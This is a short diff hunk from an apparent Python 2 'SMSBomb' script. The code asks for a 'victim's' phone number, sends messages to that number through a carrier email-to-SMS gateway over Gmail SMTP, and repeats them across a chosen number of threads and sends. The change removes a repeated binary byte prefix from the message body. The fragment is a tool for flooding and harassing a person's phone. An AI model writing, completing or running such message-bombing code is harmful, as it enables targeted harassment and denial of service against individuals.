@@ -74,7 +74,7 @@ def SMSBomb():
         carrier = "@vtext.com"
     msg_to = raw_input('\t[!] What is the victims number: +')+str(carrier)  
     thread_count = raw_input('\t[!] How many threads: ')
-    msg_text = '\xd7\x30'*40 + packet*int(thread_count)
+    msg_text = packet*int(thread_count)
     thread_send = raw_input('\t[!] How many times would you like to send the thread: ')
     thread_sending = ("From:%s\rTo:%s\r\r%s" % (gmail_username, "" .join(msg_to), "" .join(msg_text)))
     session = s.SMTP(smtp_server, smtp_port)
